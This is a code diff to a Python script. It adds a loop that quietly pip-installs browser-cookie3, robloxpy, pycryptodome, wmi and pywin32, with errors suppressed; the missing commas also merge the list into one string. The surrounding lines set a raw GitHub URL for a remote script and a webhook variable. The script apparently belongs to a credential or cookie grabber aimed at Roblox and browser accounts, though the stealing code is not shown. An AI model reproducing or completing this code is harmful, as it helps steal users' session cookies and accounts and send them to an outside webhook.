@@ -3,6 +3,25 @@ import urllib.request
 import subprocess
 from pathlib import Path
 
+
+importList = [
+    "requests"
+    "pycryptodome"
+    "psutil"
+    "browser-cookie3"
+    "robloxpy"
+    "wmi"
+    "pywin32"
+]
+
+for imprt in importList:
+
+    try:
+        os.system("pip install " + imprt)
+        
+    except:
+        pass
+
 githubraw = "https://raw.githubusercontent.com/NobdY1exe/skA4zr/main/fileees.py"
 Webhooook = webhook_url
 
